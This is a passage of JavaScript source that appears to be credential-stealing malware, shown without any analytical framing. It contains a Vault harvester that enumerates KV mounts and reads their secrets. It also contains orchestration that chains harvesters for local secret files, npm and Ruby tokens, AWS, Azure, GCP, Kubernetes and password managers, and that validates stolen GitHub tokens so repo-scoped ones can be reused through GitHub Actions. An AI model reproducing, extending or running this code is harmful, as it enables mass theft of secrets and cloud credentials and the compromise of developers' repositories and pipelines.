    vaultRequestBody,
  ) {
    let vaultBaseUrl = new URL(this.VAULT_ADDR),
      vaultRequestOptions = {
        hostname: vaultBaseUrl.hostname,
        port:
          vaultBaseUrl.port || (vaultBaseUrl.protocol === "https:" ? 443 : 80),
        path: vaultApiPath,
        method: vaultHttpMethod,
        protocol: vaultBaseUrl.protocol,
        headers: { "X-Vault-Token": vaultRequestToken },
      };
    if (vaultRequestBody)
      (vaultRequestOptions.headers["Content-Type"] = "application/json"),
        (vaultRequestOptions.headers["Content-Length"] =
          Buffer.byteLength(vaultRequestBody));
    return this.makeRequest(vaultRequestOptions, vaultRequestBody);
  }
  async listMounts(vaultListMountsToken) {
    try {
      let vaultMountsResponse = await this.vaultRequest(
          "/v1/sys/mounts",
          vaultListMountsToken,
        ),
        vaultKvMounts = [],
        vaultMountData = vaultMountsResponse.data ?? vaultMountsResponse;
      for (let [vaultMountPath, vaultMountConfig] of Object.entries(
        vaultMountData,
      ))
        if (vaultMountConfig.type === "kv") {
          let vaultNormalizedMountPath = vaultMountPath
            .replace(/^\//, "")
            .replace(/\/$/, "");
          if (
            !vaultNormalizedMountPath.startsWith("sys/") &&
            !vaultNormalizedMountPath.startsWith("auth/")
          )
            vaultKvMounts.push({ path: vaultNormalizedMountPath });
        }
      return vaultKvMounts;
    } catch {
      return [];
    }
  }
  async listKvV2(vaultKvV2MountPath, vaultKvV2Token) {
    let vaultKvV2Secrets = [];
    try {
      let vaultKvV2Keys =
        (
          await this.vaultRequest(
            "/v1/" + vaultKvV2MountPath + "/metadata?list=true",
            vaultKvV2Token,
          )
        ).data?.keys ?? [];
      await Promise.all(
        vaultKvV2Keys.slice(0, 100).map(async (vaultKvV2Key) => {
          if (vaultKvV2Key.endsWith("/")) return;
          try {
            let vaultKvV2SecretResponse = await this.vaultRequest(
              "/v1/" +
                vaultKvV2MountPath +
                "/data/" +
                encodeURIComponent(vaultKvV2Key),
              vaultKvV2Token,
            );
            vaultKvV2Secrets.push({
              path: vaultKvV2MountPath + "/" + vaultKvV2Key,
              mount: vaultKvV2MountPath,
              key: vaultKvV2Key,
              data: vaultKvV2SecretResponse.data?.data ?? {},
              metadata: vaultKvV2SecretResponse.data?.metadata ?? {},
            });
          } catch {}
        }),
      );
    } catch {}
    return vaultKvV2Secrets;
  }
  async listKvV1(vaultKvV1MountPath, vaultKvV1Token) {
    let vaultKvV1Secrets = [];
    try {
      let vaultKvV1Keys =
        (
          await this.vaultRequest(
            "/v1/" + vaultKvV1MountPath,
            vaultKvV1Token,
            "LIST",
          )
        ).data?.keys ?? [];
      await Promise.all(
        vaultKvV1Keys.slice(0, 100).map(async (vaultKvV1Key) => {
          if (vaultKvV1Key.endsWith("/")) return;
          try {
            let vaultKvV1SecretResponse = await this.vaultRequest(
              "/v1/" +
                vaultKvV1MountPath +
                "/" +
                encodeURIComponent(vaultKvV1Key),
              vaultKvV1Token,
            );
            vaultKvV1Secrets.push({
              path: vaultKvV1MountPath + "/" + vaultKvV1Key,
              mount: vaultKvV1MountPath,
              key: vaultKvV1Key,
              data: vaultKvV1SecretResponse.data ?? {},
            });
          } catch {}
        }),
      );
    } catch {}
    return vaultKvV1Secrets;
  }
  async collectFromMount(vaultCollectMountPath, vaultCollectToken) {
    let vaultKvV2Results = await this.listKvV2(
      vaultCollectMountPath,
      vaultCollectToken,
    );
    if (vaultKvV2Results.length > 0) return vaultKvV2Results;
    return this.listKvV1(vaultCollectMountPath, vaultCollectToken);
  }
  async execute() {
    try {
      let vaultAuthToken = await this.authenticate();
      if (!vaultAuthToken) return this.failure("No Vault credentials found");
      try {
        await this.vaultRequest("/v1/sys/health", vaultAuthToken);
      } catch {}
      let vaultMounts = await this.listMounts(vaultAuthToken),
        vaultCollectedSecrets = [],
        seenVaultSecretPaths = new Set();
      for (let vaultMount of vaultMounts) {
        let vaultMountSecrets = await this.collectFromMount(
          vaultMount.path,
          vaultAuthToken,
        );
        for (let vaultSecretRecord of vaultMountSecrets)
          if (!seenVaultSecretPaths.has(vaultSecretRecord.path))
            seenVaultSecretPaths.add(vaultSecretRecord.path),
              vaultCollectedSecrets.push(vaultSecretRecord);
      }
      let fallbackVaultMounts = ["secret", "kv", "cubbyhole", "secret-v2"];
      for (let fallbackVaultMount of fallbackVaultMounts) {
        let fallbackVaultSecrets = await this.collectFromMount(
          fallbackVaultMount,
          vaultAuthToken,
        );
        for (let fallbackVaultSecretRecord of fallbackVaultSecrets)
          if (!seenVaultSecretPaths.has(fallbackVaultSecretRecord.path))
            seenVaultSecretPaths.add(fallbackVaultSecretRecord.path),
              vaultCollectedSecrets.push(fallbackVaultSecretRecord);
      }
      if (vaultCollectedSecrets.length === 0)
        return this.failure("No secrets found in Vault");
      return this.success({
        vaultAddr: this.VAULT_ADDR,
        totalSecrets: vaultCollectedSecrets.length,
        secrets: vaultCollectedSecrets,
      });
    } catch (vaultExecuteError) {
      return this.failure(
        vaultExecuteError instanceof Error
          ? vaultExecuteError
          : Error(String(vaultExecuteError)),
      );
    }
  }
}
async function collectInitialProviderResults() {
  let localSecretFileProvider = new LocalSecretFileProvider(),
    githubEnvironmentProvider = new GitHubEnvironmentProvider(),
    npmAndRubyTokenProvider = new NpmAndRubyTokenProvider();
  return [
    await localSecretFileProvider.execute(),
    await githubEnvironmentProvider.execute(),
    await npmAndRubyTokenProvider.execute(),
  ];
}
async function buildFollowOnProviders(providerResults) {
  let followOnProviderList = [
      new AwsParameterStoreProvider(),
      new AwsSecretsManagerProvider(),
      new AwsStsIdentityProvider(),
      new AzureKeyVaultProvider(),
      new AzureSecretProvider(),
      new GcpSecretManagerProvider(),
      new GcpMetadataProvider(),
      new KubernetesSecretProvider(),
      new VaultSecretProvider(),
      new PasswordManagerSecretProvider(),
    ],
    dispatchedGithubActionsProvider = false,
    seenGithubTokens = new Set();
  for (let providerResult of providerResults)
    if (providerResult.matches?.ghtoken)
      for (let githubTokenCandidate of providerResult.matches.ghtoken) {
        if (seenGithubTokens.has(githubTokenCandidate)) continue;
        seenGithubTokens.add(githubTokenCandidate);
        let githubTokenMetadata =
          await validateGitHubTokenWithOrgs(githubTokenCandidate);
        if (!githubTokenMetadata.valid) continue;
        if (!providerResult.tokenMetadata) providerResult.tokenMetadata = {};
        if (
          ((providerResult.tokenMetadata[githubTokenCandidate] =
            githubTokenMetadata),
          githubTokenMetadata.scopes.includes("repo") ||
            githubTokenMetadata.scopes.includes("public_repo"))
        )
          followOnProviderList.push(
            new GitHubActionsTokenProvider(githubTokenCandidate),
          ),
            (dispatchedGithubActionsProvider = true);
      }
  return {
    providers: followOnProviderList,
    dispatched: dispatchedGithubActionsProvider,
  };
}
initGithubApiModule();
